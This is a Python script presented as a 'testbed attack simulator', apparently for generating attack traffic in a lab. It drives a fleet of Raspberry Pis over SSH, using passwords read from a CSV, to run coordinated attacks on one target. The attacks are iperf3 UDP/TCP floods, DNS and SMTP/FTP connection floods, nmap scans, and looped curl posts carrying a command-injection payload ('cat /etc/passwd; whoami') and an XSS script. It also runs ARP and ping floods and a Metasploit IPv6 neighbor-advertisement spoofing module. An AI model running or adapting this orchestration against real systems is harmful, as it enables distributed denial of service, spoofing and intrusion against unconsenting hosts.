import paramiko
import argparse
import threading
import time
import sys
import os
import ipaddress


# --- Configuration ---
# Note: SSH credentials are now read from the external CSV file provided in --pies

def is_ipv6(ip):
    """
    Validates IP version using the ipaddress library or simple string check.
    """
    try:
        # If it has a colon, treat as IPv6
        return ":" in ip
    except ValueError:
        return False


def format_url_ip(ip):
    """
    Wraps IPv6 addresses in brackets for usage in URLs.
    Example: 2001:db8::1 -> [2001:db8::1]
    """
    if is_ipv6(ip):
        return f"[{ip}]"
    return ip


def get_attack_command(attack_type, target, duration, data_size, protocol, sleep_interval):
    """
    Generates commands compatible with both IPv4 and IPv6.
    """
    # Detect IP Version of the TARGET
    ipv6_mode = is_ipv6(target)

    # Set Flags based on IP version
    if ipv6_mode:
        inet_flag = "-6"
        ping_cmd = "ping6"
        # Ncat/Netcat often needs -6 explicitly
        nc_flag = "-6"
    else:
        inet_flag = "-4"
        ping_cmd = "ping"
        nc_flag = "-4"

    # 1. NEW: NDP Attack (via Metasploit)
    if attack_type.upper() == "NDP" or attack_type.upper() == "ndp":
        if not ipv6_mode:
            return f"echo 'Error: NDP attack requires an IPv6 target. Falling back to ping.'; ping {target} -c 5"

        # We create a 'Resource Script' for Metasploit to run non-interactively
        # This module sends spoofed Neighbor Advertisements
        msf_script = (
            f"use auxiliary/spoof/ipv6/ipv6_neighbor_adver; "
            f"set RHOSTS {target}; "
            f"set INTERFACE eth0; "
            f"run -j; "
            f"sleep {duration}; "
            f"exit"
        )
        return f"msfconsole -q -x '{msf_script}'"


    # 2. DDoS Simulation
    if attack_type.upper() == "DDOS":

        # UDP/TCP Flood
        # iperf3 handles IPv6 natively, but passing -6 ensures it binds correctly.
        if protocol.upper() in ["UDP", "TCP"]:
            udp_flag = "-u" if protocol.upper() == "UDP" else ""
            size_flag = f"--len {data_size}" if data_size else ""
            # -V enables verbose (helpful for debugging), inet_flag forces version
            return f"iperf3 {inet_flag} -c {target} {udp_flag} -t {duration} --bandwidth 100M {size_flag}"

        # DNS Flood
        elif protocol.upper() == "DNS":
            # dig syntax: dig @server name
            return f"timeout {duration} bash -c 'while true; do dig {inet_flag} @{target} test.local +short; sleep {sleep_interval}; done'"

        # SMTP/FTP Flood (Connection Flooding)
        elif protocol.upper() in ["SMTP", "FTP"]:
            port = 25 if protocol.upper() == "SMTP" else 21
            return f"timeout {duration} bash -c 'while true; do echo QUIT | nc {nc_flag} -w 1 {target} {port}; sleep {sleep_interval}; done'"

    # 3. Web & Recon Attacks

    # Prepare URL target (needs brackets if IPv6)
    url_target = format_url_ip(target)

    cmd_map = {
        "RECON": f"nmap {inet_flag} -F {target}",
        # Curl: -g switches off "globbing" which sometimes interferes with IPv6 brackets, though modern curl handles it well.
        "RCE": f"timeout {duration} bash -c 'while true; do curl -g {inet_flag} -X POST -d \"cmd=cat /etc/passwd; whoami\" http://{url_target}/; sleep {sleep_interval}; done'",
        "XSS": f"timeout {duration} bash -c 'while true; do curl -g {inet_flag} -X POST -d \"comment=<script>alert(1)</script>\" http://{url_target}/; sleep {sleep_interval}; done'",
    }

    # MITM / Discovery Noise
    # IPv4 uses ARP (arping). IPv6 uses NDP. 'arping' fails on IPv6.
    # We fallback to a ping flood to simulate discovery noise on IPv6.
    if attack_type.upper() == "MITM":
        if ipv6_mode:
            # IPv6 Fallback: Fast ping6 to generate traffic noise
            return f"timeout {duration} {ping_cmd} -f -c {int(duration * 100)} {target}"
        else:
            # IPv4: Standard ARP flooding
            return f"timeout {duration} arping -U -c {int(duration / sleep_interval) + 1} -I eth0 {target}"

    return cmd_map.get(attack_type.upper(), f"{ping_cmd} -c 5 {target}")


def execute_remote(pi_config, command, thread_id):
    """
    Connects to a single Pi and runs the command.
    """
    ip = pi_config['ip']
    user = pi_config['user']
    password = pi_config['pass']

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        print(f"[{thread_id}] Connecting to {ip}...")

        # Connect to the Pi. Paramiko handles IPv6 addresses automatically in the string.
        client.connect(ip, username=user, password=password, timeout=10)

        print(f"[{thread_id}] Executing: {command}")
        stdin, stdout, stderr = client.exec_command(command)

        # Wait for command completion
        exit_status = stdout.channel.recv_exit_status()

        if exit_status == 0:
            print(f"[{thread_id}] {ip} Finished Successfully.")
        else:
            err = stderr.read().decode()
            # Ignore "Terminated" errors caused by the 'timeout' command
            if "Terminated" in err or "Killed" in err:
                print(f"[{thread_id}] {ip} Completed (Time limit reached).")
            else:
                print(f"[{thread_id}] {ip} Output/Error: {err.strip()}")

    except Exception as e:
        print(f"[{thread_id}] Connection Failed to {ip}: {e}")
    finally:
        client.close()


def load_pies_from_file(filepath):
    """
    Parses CSV: IP,Username,Password
    """
    if not os.path.exists(filepath):
        print(f"Error: File '{filepath}' not found.")
        sys.exit(1)

    pies = []
    with open(filepath, 'r') as f:
        for line_num, line in enumerate(f, 1):
            line = line.strip()
            if not line or line.startswith("#"): continue

            parts = line.split(',')
            if len(parts) != 3:
                print(f"Warning: Skipping malformed line {line_num}: {line}")
                continue

            pies.append({
                'ip': parts[0].strip(),
                'user': parts[1].strip(),
                'pass': parts[2].strip()
            })
    return pies


def main():
    parser = argparse.ArgumentParser(description="Testbed Attack Simulator")

    # Arguments
    parser.add_argument("--which-attack", required=True, help="Acronyms: DDOS, RECON, RCE, XSS, MITM")
    parser.add_argument("--pies", required=True, help="Path to CSV file (IP,User,Pass)")
    parser.add_argument("--target", required=True, help="IP address of the target (IPv4 or IPv6)")

    # Protocol & Tuning
    parser.add_argument("--protocol", choices=['UDP', 'TCP', 'DNS', 'SMTP', 'FTP'], default='UDP')
    parser.add_argument("--parallelism", choices=['yes', 'no'], default='yes')
    parser.add_argument("--threads", type=int, default=2)
    parser.add_argument("--duration", type=int, default=10)
    parser.add_argument("--sleep-interval", type=float, default=0.5)
    parser.add_argument("--data-size", default=None)

    args = parser.parse_args()

    # Load Pies
    pi_list = load_pies_from_file(args.pies)
    if not pi_list:
        sys.exit("Error: No devices found in file.")

    # Generate Command (Auto-detects IPv4/IPv6 from target string)
    cmd = get_attack_command(
        args.which_attack,
        args.target,
        args.duration,
        args.data_size,
        args.protocol,
        args.sleep_interval
    )

    print(f"--- Initiating {args.which_attack} against {args.target} ---")
    print(f"--- Protocol: {args.protocol} | IPv6 Mode: {is_ipv6(args.target)} ---")

    threads = []

    if args.parallelism == 'yes':
        for i, pi_config in enumerate(pi_list):
            t = threading.Thread(target=execute_remote, args=(pi_config, cmd, i))
            threads.append(t)
            t.start()

            if len(threads) >= args.threads:
                for t in threads: t.join()
                threads = []
        for t in threads: t.join()
    else:
        for i, pi_config in enumerate(pi_list):
            execute_remote(pi_config, cmd, i)

    print("\n--- Simulation Complete ---")


if __name__ == "__main__":
    main()